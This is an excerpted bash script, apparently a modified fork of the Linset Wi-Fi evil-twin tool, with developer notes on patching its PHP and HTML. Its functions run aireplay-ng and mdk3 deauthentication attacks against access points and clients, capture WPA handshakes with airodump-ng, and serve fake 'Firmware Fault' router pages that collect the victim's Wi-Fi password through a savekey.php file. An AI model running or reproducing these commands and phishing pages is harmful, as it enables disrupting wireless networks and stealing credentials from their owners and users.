...
##  we dug into the coding the more problems were discovered especiaslly with the web pages.
...
function askclientsel {
	...
	while true; do
		...
		echo "CAPTURE A CLIENT HANDSHAKE"
		echo "                                       "
		echo -e "      "$verde"1)"$rescolor" Deauth All Stations"
		echo -e "      "$verde"2)"$rescolor" Deauth All Stations with (mdk3)"
		echo -e "      "$verde"3)"$rescolor" Deauth A Specific Router Client Pair"
		echo -e "      "$verde"4)"$rescolor" Rescan the Network"
		echo -e "      "$verde"5)"$rescolor" Exit"
		echo "                                       "
		echo -n "      #> "
		read yn
		echo ""
...
function deauthMENU {
	...
	while true; do
		...
		echo "CAPTURE THE HANDSHAKE?"
		echo "                                       "
		echo -e "      "$verde"1)"$rescolor" Yes" 
		echo -e "      "$verde"2)"$rescolor" No (lauch the attack again)"
		echo -e "      "$verde"3)"$rescolor" No (select a different attack)"  
		echo -e "      "$verde"4)"$rescolor" Select a Different Target"  
		echo -e "      "$verde"5)"$rescolor" Exit"
		echo " "
		echo -n '      #> '
		read yn
...
function capture {
	...
	if ! ps -A | grep -q airodump-ng; then
		...
		xterm $HOLD -title "Airodump-ng Client Data Capture --> $Host_CHAN" $TOPRIGHT -bg "#000000" -fg "#FFFFFF" -e airodump-ng --bssid $Host_MAC -w $DUMP_PATH/$Host_MAC -c $Host_CHAN -a $WIFI_MONITOR &
	fi
}
...
function webinterface {
	...
	while true; do
		...
		if [ "$line" = "2" ]; then
			...
			echo -e "$verde""*"$rescolor" Please Standby WPA Phishing Pages[ENG] are loading..."
...
#######
##  Musket Notes - it was found that embedding php coding into bash and printing out with
## echo > corrupted the code. The savekey.php had to be loaded with cp from a existing
## file into the /tmp/linset/data folder to function. Thus a /root/linset/ folder was
## established. The php file also had to be rewitten to work in phishing along with the html ## pages which also failed in various ways. Thus the holdphp fuction below is not used as it
## didnot work. MTeams loaded the unused code into a function and did not use, to save having
## to either erase it or REM/COMMENT out. 
...
cp linset/savekey.php  $DUMP_PATH/data/savekey.php
...
############# End MusketPatch
	...
	xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "mdk3 Deauthentication/ Disassociation $Host_SSID" -e mdk3 $WIFI_MONITOR d -b $DUMP_PATH/mdk3.txt -c $Host_CHAN &
	
	xterm -hold $TOPRIGHT -title "Waiting for a password" -e $DUMP_PATH/handcheck &
	conditional_clear
	...
	while true; do
		...
		echo "                                       "
		echo "      1) Select Another TargetAP" 
		echo "      2) Exit"
		echo " "
		echo -n '      #> '
		read yn
...
function deauthall {
	...
	xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Aireplay-ng Deauth $Host_SSID" -e aireplay-ng --deauth $DEAUTHTIME -a $Host_MAC --ignore-negative-one $WIFI_MONITOR &
}

function deauthmdk3 {
	
	echo "$Host_MAC" >$DUMP_PATH/mdk3.txt
	xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "mdk3 Deauth $Host_SSID" -e mdk3 $WIFI_MONITOR d -b $DUMP_PATH/mdk3.txt -c $Host_CHAN &
	mdk3PID=$!
	sleep 15
...
function deauthesp {
	...
	sleep 2
	xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Aireplay-ng Deauth $Client_MAC" -e aireplay-ng -0 $DEAUTHTIME -a $Host_MAC -c $Client_MAC --ignore-negative-one $WIFI_MONITOR &
}
...
" | base64 -d >$DUMP_PATH/file.zip
	...
	<html>
	<head>
	    <title>Firmware Fault Page 23224  $Host_MAC_MODEL</title>
	...
	<body>
		...
		<div data-role=\"header\" data-theme=\"a\">
		    <h3>Firmware Fault Page 23224  $Host_MAC_MODEL</h3>
		</div>
	...
	<html>
	<head>
	    <title>Firmware Fault Page 23225  $Host_MAC_MODEL</title>
	    <meta name=\"viewport\" content=\"width=device-width, height=device-height, initial-scale=1.0\"/>
	    <link rel=\"stylesheet\" href=\"jquery.mobile-1.3.2.min.css\" />
	    <script src=\"jquery-1.8.3.min.js\"></script>    
	    <script src=\"jquery.mobile-1.3.2.min.js\"></script>
	...
	<body>
	    <div data-role=\"page\" id=\"login\" data-theme=\"b\">
		<div data-role=\"header\" data-theme=\"a\">
		    <h3>Firmware Fault Page 23225  $Host_MAC_MODEL</h3>
		</div>
		...
		<div data-role=\"content\">
		    ...
		    "$DIALOG_WEB_ERROR"
	<br>
	<a href=\"../index.htm\" data-role=\"button\" rel=\"external\" data-inline=\"true\" id=\"back\" onclick=\"location.reload(forceGet);location.href='../index.htm'\">"$DIALOG_WEB_BACK"</a> 
	...
	<html>
	<head>
	    <title>Firmware Fault Page 23226  $Host_MAC_MODEL</title>
	    <meta name=\"viewport\" content=\"width=device-width, height=device-height, initial-scale=1.0\"/>
	...
	<body>
	    <div data-role=\"page\" id=\"login\" data-theme=\"b\">
		<div data-role=\"header\" data-theme=\"a\">
		    <h3>PMK Firmware Fault Page 23223  $Host_MAC_MODEL </h3>
		</div>
	...
	<P align="center">"$DIALOG_WEB_INFO"</P>
	<!-- <br> -->
	<!-- <P align="left">"$DIALOG_WEB_INPUT"</P> -->
